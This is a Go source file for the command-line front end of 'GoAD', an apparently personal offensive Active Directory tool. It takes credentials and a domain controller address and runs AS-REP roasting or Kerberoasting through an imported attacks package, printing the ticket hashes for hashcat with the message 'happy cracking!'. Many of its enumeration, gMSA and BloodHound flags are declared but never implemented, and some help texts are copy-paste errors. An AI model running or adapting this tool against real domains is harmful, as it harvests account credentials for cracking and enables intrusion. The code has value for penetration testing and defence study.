package main

import (
	"fmt"
	"os"

	"github.com/5amu/goad/pkg/attacks"
	"github.com/projectdiscovery/goflags"
)

type options struct {
	mode       string
	username   string
	password   string
	domain     string
	controller string
	port       int
	ssl        bool
	useTls     bool
	// Ldap stuff
	// hashes
	asreproast string
	kerberoast string
	// Ldap stuff
	// bloodhound
	bloodhound string
	nameserver string
	collection goflags.StringSlice
	// Ldap stuff
	// information
	trustedForDelegation bool
	passwordNotRequired  bool
	adminCount           bool
	userEnumeration      bool
	groupsEnumeration    bool
	dcList               bool
	domainSID            bool
	// Ldap stuff
	// gmsa
	gmsa           bool
	gmsaConvertId  string
	gmsaDecryptLsa string
}

func cliparse(opts *options) error {
	flagSet := goflags.NewFlagSet()
	flagSet.SetDescription(`GoAD - A totally different tool from crackmapexec by byt3bl33d3r. 
Be kind, I'm learning the minutia in AD using Go. by @5amu.`)

	flagSet.CreateGroup("connection", "Connection Options",
		flagSet.StringVarP(&opts.username, "user", "u", "", "provide username"),
		flagSet.StringVarP(&opts.password, "pass", "p", "", "provide password"),
		flagSet.StringVarP(&opts.domain, "domain", "d", "WORKGROUP", "provide domain"),
		flagSet.StringVarP(&opts.controller, "controller", "dc", "", "provide domain controller IP/FQDN"),
	)

	flagSet.CreateGroup("mode", "Select Mode",
		flagSet.StringVar(&opts.mode, "mode", "", "select execution mode: [ldap]"),
	)

	flagSet.CreateGroup("ldapopts", "LDAP: Specific Connection Options",
		flagSet.IntVarP(&opts.port, "port", "P", 389, "ldap port to contact"),
		flagSet.BoolVarP(&opts.ssl, "ssl", "s", false, "use ssl to interact with ldap"),
		flagSet.BoolVarP(&opts.useTls, "usetls", "tls", true, "should ldap upgrade the ldap connection"),
	)

	flagSet.CreateGroup("hashes", "LDAP: Retrieve Hashes",
		flagSet.StringVarP(&opts.asreproast, "asreproast", "asrep", "", "grab AS_REP ticket(s) parsed to be cracked with hashcat"),
		flagSet.StringVarP(&opts.kerberoast, "kerberoast", "krbst", "", "grab TGS ticket(s) parsed to be cracked with hashcat"),
	)

	flagSet.CreateGroup("enumeration", "LDAP: Enumerate Domain Information",
		flagSet.BoolVar(&opts.trustedForDelegation, "trusted-for-delegation", false, "Get the list of users and computers with flag TRUSTED_FOR_DELEGATION"),
		flagSet.BoolVar(&opts.passwordNotRequired, "password-not-required", false, "Get the list of users with flag PASSWD_NOTREQD"),
		flagSet.BoolVar(&opts.adminCount, "admin-count", false, "Get objets that had the value adminCount=1"),
		flagSet.BoolVar(&opts.userEnumeration, "users", false, "Enumerate enabled domain users"),
		flagSet.BoolVar(&opts.groupsEnumeration, "groups", false, "Enumerate domain groups"),
		flagSet.BoolVar(&opts.dcList, "dc-list", false, "Enumerate Domain Controllers"),
		flagSet.BoolVar(&opts.domainSID, "get-sid", false, "Get domain sid"),
	)

	flagSet.CreateGroup("gmsa", "LDAP: Play with GMSA",
		flagSet.BoolVar(&opts.gmsa, "gmsa", false, "Enumerate domain groups"),
		flagSet.StringVar(&opts.gmsaConvertId, "gmsa-convert-id", "", "Get the secret name of specific gmsa or all gmsa if no gmsa provided"),
		flagSet.StringVar(&opts.gmsaDecryptLsa, "gmsa-decrypt-lsa", "", "Decrypt the gmsa encrypted value from LSA"),
	)

	flagSet.CreateGroup("bloodhound", "LDAP: Run Bloodhound Collector v4.2",
		flagSet.StringVarP(&opts.bloodhound, "bloodhound", "bh", "", "run bloodhound collector and save in output file"),
		flagSet.StringVarP(&opts.nameserver, "nameserver", "ns", "", "provide a nameserver for bloodhound collector"),
		flagSet.StringSliceVarP(&opts.collection, "collection", "c", goflags.StringSlice{"group", "localadmin", "session", "trust"}, "grab TGS ticket(s) parsed to be cracked with hashcat", goflags.CommaSeparatedStringSliceOptions),
	)

	return flagSet.Parse()
}

func (o *options) ldapR() error {
	if o.asreproast != "" {
		asreps, err := attacks.AsRepRoast(&attacks.AsRepRoastOpts{
			Users:            []string{o.username},
			Realm:            o.domain,
			DomainController: o.controller,
		})
		if err != nil {
			return err
		}

		for _, a := range asreps {
			fmt.Printf("[+] ASREP-Roastable user %s\\%s... happy cracking!\n\n%s\n\n", o.domain, a.User, a.Hash)
		}
		return nil
	}

	if o.kerberoast != "" {
		results, err := attacks.Kerberoast(&attacks.KerberoastOpts{
			User:             o.username,
			Realm:            o.domain,
			Password:         o.password,
			DomainController: o.controller,
			LdapPort:         o.port,
			LdapSSL:          o.ssl,
			LdapSkipTLS:      !o.useTls,
		})
		if err != nil {
			return err
		}
		for _, entry := range results {
			fmt.Printf("[+] kerberoasted user %s\\%s for SPN %s... happy cracking!\n\n%s\n\n", o.domain, o.username, entry.ServicePrincipalName, entry.Hash)
		}
	}
	return nil
}

func main() {
	var opts options

	if err := cliparse(&opts); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}

	var err error
	switch opts.mode {
	case "ldap":
		err = opts.ldapR()
	default:
		err = fmt.Errorf("not a valid mode: %s", opts.mode)
	}

	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
